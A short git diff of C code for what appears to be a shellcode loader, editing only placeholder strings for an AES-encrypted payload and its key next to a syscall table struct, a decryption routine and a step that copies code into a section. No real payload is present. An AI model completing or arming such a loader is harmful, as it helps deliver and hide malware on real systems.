@@ -18,7 +18,7 @@ typedef struct _SYSCALL_ENTRY {
 } SYSCALL_ENTRY;
 
 
-BYTE shellcode[] = {"your AES encrypted payload here"};
+BYTE shellcode[] = {"your AES encrypted payload"};
     SIZE_T shellcodesize = sizeof(shellcode);
 
     void decryptData(const BYTE* encryptedData, SIZE_T encryptedSize, BYTE* outputData, SIZE_T* outputSize, const char* aesKey) {
@@ -218,7 +218,7 @@ int main(void){
     BYTE decryptedData[512] = { 0 }; // Buffer for decryption
     SIZE_T decryptedSize = sizeof(decryptedData);
 
-    const char* encryptionKey = "your AES key here";
+    const char* encryptionKey = "your AES key";
 
     decryptData(shellcode, shellcodesize, decryptedData, &decryptedSize, encryptionKey);
 //copying code into section
